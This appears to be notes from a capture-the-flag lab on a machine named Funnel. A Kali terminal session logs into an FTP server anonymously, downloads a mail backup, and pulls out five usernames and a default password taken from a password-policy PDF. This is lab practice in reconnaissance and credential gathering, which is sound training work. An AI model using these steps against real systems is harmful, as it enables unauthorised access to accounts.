
```sh
┌──(fixit42㉿kali)-[~]
└─$ ftp 10.129.1.73                 
Connected to 10.129.1.73.
220 (vsFTPd 3.0.3)
Name (10.129.1.73:fixit42): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||61361|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
226 Directory send OK.
ftp> cd mail_backup
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||63865|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
226 Directory send OK.
ftp> mget *
mget password_policy.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||61333|)
150 Opening BINARY mode data connection for password_policy.pdf (58899 bytes).
100% |*********************************************************************************| 58899        0.99 MiB/s    00:00 ETA
226 Transfer complete.
58899 bytes received in 00:00 (690.37 KiB/s)
mget welcome_28112022 [anpqy?]? y
229 Entering Extended Passive Mode (|||55782|)
150 Opening BINARY mode data connection for welcome_28112022 (713 bytes).
100% |*********************************************************************************|   713       78.06 KiB/s    00:00 ETA
226 Transfer complete.
713 bytes received in 00:00 (19.40 KiB/s)
ftp> exit
221 Goodbye.
```


```sh
┌──(fixit42㉿kali)-[~]
└─$ cat welcome_28112022   
Frome: root@funnel.htb
To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
Subject:Welcome to the team!

Hello everyone,
We would like to welcome you to our team. 
We think you’ll be a great asset to the "Funnel" team and want to make sure you get settled in as smoothly as possible.
We have set up your accounts that you will need to access our internal infrastracture. Please, read through the attached password policy with extreme care.
All the steps mentioned there should be completed as soon as possible. If you have any questions or concerns feel free to reach directly to your manager. 
We hope that you will have an amazing time with us,
The funnel team. 

```

users:
optimus
albert
andreas
christine
maria

in the pdf:
`For example the default password of “funnel123#!#” must be changed immediately.`

password:
funnel123#!#

